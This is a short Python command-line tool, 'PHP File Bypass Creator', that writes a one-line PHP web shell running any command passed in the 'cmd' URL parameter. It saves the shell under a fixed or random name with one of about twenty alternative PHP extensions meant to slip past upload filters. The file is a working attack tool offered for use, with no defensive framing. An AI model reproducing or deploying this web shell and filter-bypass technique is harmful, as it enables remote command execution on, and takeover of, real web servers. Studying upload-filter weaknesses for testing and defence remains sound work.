#!/bin/python3

import string
import random
import argparse

content = "<?php system($_GET['cmd']); ?>"
file_name = "shell"

Ext = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]



def random_create(exten):
	random_chars = []
	for i in range(0,15):
		char = random.choice(string.ascii_letters)
		random_chars.append(char)
	file_name = "".join(random_chars)

	for ext in Ext:
		if ext == exten:
			#file_name = file_name+ext
			f = open(file_name+ext, 'w')
			f.write(content)
			f.close()
			break


def create(exten):
	for ext in Ext:
		if ext == exten:
			f = open(file_name+ext, 'w')
			f.write(content)
			f.close()
			break
		

	

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="PHP File Bypass Creator")
	parser.add_argument("-e", '--extension', required=True, type=str, help="Extenstion To Use (Check Source For All Types)")
	parser.add_argument("-r", '--rand_ext', type=str, help="Create Random File Name")

	args = parser.parse_args()

	random_choice = args.rand_ext
	ext = args.extension

	if random_choice == 'y':
		random_create(ext)
	else:
		create(ext)
